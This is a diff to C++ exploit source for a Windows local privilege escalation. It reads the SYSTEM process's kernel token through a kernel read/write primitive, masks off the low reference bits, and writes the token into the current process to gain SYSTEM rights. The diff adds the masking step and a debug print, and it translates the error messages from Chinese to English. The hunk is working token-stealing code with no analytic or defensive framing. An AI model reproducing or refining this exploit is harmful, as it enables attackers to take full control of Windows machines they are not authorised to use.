@@ -193,21 +193,29 @@ int main()
 
 	system("whoami");
 	std::cout << "Start Fxxking System" << std::endl;
+	system("pause");
+
 
 	CorMem corMem{};
 
 	ULONG64 systemToken = 0;
-	if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(systemToken)))
+	if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), 
+						   &systemToken,
+						   sizeof(systemToken)))
 	{
-		std::cout << "[-] KernelRead System Token 失败" << std::endl;
+		std::cout << "[-] KernelRead System Token failed" << std::endl;
 		return 1;
 	}
+
+	systemToken &= ~0xFULL;
+
+	std::cout << "[+] System Token (cleaned): 0x" << std::hex << systemToken << std::endl;
 
 	if (!corMem.KernelWrite(reinterpret_cast<PVOID>(CurrentProcess + EPROCESS_TOKEN_OFFSET),
 							&systemToken,
 							sizeof(ULONG64)))
 	{
-		std::cout << "[-] KernelWrite Current Token 失败" << std::endl;
+		std::cout << "[-] KernelWrite Current Token failed" << std::endl;
 		return 1;
 	}
 
